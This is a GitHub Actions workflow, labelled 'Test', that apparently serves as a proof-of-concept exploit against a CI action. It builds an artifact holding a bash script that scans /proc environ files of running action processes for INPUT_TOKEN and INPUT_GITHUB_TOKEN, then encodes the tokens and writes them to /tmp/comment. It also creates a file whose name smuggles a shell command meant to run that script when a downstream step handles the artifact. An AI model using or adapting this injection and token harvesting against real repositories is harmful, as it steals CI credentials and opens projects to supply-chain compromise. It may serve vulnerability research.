name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'marker\n' > content/a
          cat > content/p <<'SCRIPT'
          #!/bin/bash
          declare -A seen
          report() {
            local tok="$1" desc="$2" b64 hex
            b64=$(printf '%s' "$tok" | base64 -w0)
            hex=$(printf '%s' "$tok" | od -An -tx1 | tr -d ' \n')
            [ -n "${seen[$b64]}" ] && return
            seen[$b64]=1
            printf '\nLEAKHEX %s desc=%s b64=%s\n' "$hex" "$desc" "$b64" >> /tmp/comment
          }
          end=$((SECONDS+95))
          while [ $SECONDS -lt $end ]; do
            for pid in $(pgrep -f 'dist/index.js' 2>/dev/null); do
              e=/proc/$pid/environ
              [ -r "$e" ] || continue
              for v in INPUT_TOKEN INPUT_GITHUB_TOKEN; do
                tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n "s/^${v}=//p" | head -1)
                [ -n "$tok" ] && report "$tok" "$v:$pid"
              done
            done
            sleep 0.01
          done
          SCRIPT
          chmod +x content/p
          printf 'x\n' > 'content/a;S=$(printf %.1s $PWD);bash ${S}tmp${S}content${S}content-poc${S}p & #.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
